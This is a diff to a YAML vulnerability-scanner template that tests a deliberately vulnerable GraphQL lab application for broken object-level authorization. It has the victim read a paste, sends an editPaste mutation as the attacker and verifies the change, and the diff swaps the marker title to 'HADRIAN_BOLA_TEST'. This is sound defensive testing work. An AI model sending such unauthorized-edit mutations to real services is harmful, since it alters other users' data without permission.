@@ -44,16 +44,17 @@ graphql:
         }
       }
     auth: "victim"
-    store_response_fields:
-      original_title: "data.paste.title"
     matchers:
       - type: status
         status: [200]
+      - type: word
+        words: ["ownerId"]
+        part: body
 
   # Phase 2: Attack - attacker modifies victim's paste
   - query: |
       mutation EditPaste {
-        editPaste(id: 1, title: "ATTACKER_MODIFIED", content: "Unauthorized modification by attacker") {
+        editPaste(id: 1, title: "HADRIAN_BOLA_TEST", content: "Unauthorized modification by attacker") {
           paste {
             id
             title
@@ -67,7 +68,7 @@ graphql:
       - type: status
         status: [200]
       - type: word
-        words: ["ATTACKER_MODIFIED"]
+        words: ["HADRIAN_BOLA_TEST"]
         part: body
 
   # Phase 3: Verify - victim re-reads to confirm change persisted
@@ -85,16 +86,14 @@ graphql:
       - type: status
         status: [200]
       - type: word
-        words: ["ATTACKER_MODIFIED"]
+        words: ["HADRIAN_BOLA_TEST"]
         part: body
 
 detection:
   success_indicators:
-    - type: status_code
-      status_code: 200
     - type: body_field
       body_field: "data.paste.title"
-      value: "ATTACKER_MODIFIED"
+      value: "HADRIAN_BOLA_TEST"
   vulnerability_pattern: "dvga_bola_paste_mutation_verified"
   conditions:
     - attack_phase_status: [200]
